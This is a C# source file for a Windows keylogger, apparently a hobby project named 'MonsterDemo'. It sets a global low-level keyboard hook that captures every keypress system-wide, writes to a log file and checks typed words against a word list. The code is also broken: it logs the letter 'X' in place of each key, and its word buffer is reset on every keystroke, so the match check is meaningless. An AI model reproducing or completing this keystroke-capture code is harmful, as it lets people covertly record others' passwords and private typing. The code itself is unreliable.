using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MonsterDemo //name it the same as your project name
{
    class KeyLogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static string notepadPath = null;
        private static LowLevelKeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        public static void Start(string _notepadPath)
        {
            notepadPath = _notepadPath;
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                string word="";

               
                int vkCode = Marshal.ReadInt32(lParam);
                var keyName = Enum.GetName(typeof(Keys), vkCode);
                string currentLog = File.ReadAllText(notepadPath);

                if (keyName == "Space")
                {

                    if (File.ReadAllText(Application.StartupPath+ @"\words.txt").Contains(word))
                    {
                        MessageBox.Show("There is a match");
                    }
                }
                word += keyName;
               
             

           
                using (StreamWriter sw = new StreamWriter(notepadPath))
                {
                    

                    sw.Write(currentLog + 'X');

                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}
